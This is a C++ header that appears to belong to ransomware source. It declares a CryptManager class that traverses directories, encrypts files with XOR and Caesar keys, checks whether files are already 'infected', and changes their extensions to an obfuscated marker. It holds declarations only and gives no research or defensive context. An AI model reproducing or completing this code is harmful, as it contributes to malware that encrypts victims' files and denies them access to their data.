#pragma once
#include "crypt/FileEncryptor.h"
#include "Obfuscator.h"
#include <string>
#include <vector>

class CryptManager
{
public:
	CryptManager(char xorKey);
	void start(const std::wstring& path);

private:
	FileEncryptor encryptor;
	const std::vector<unsigned char> encryptedExtension = { 0x0c, 0x4a, 0x4d, 0x41 };
	static constexpr int caesarKey = 0xDE;

	void _traverseAndEncrypt(const std::wstring& path);
	bool _isFileInfected(const std::filesystem::directory_entry& file) const;
	void _changeExtension(const std::filesystem::directory_entry& file);
	void _encrypFile(const std::filesystem::directory_entry& file);

	char xorKey;
};
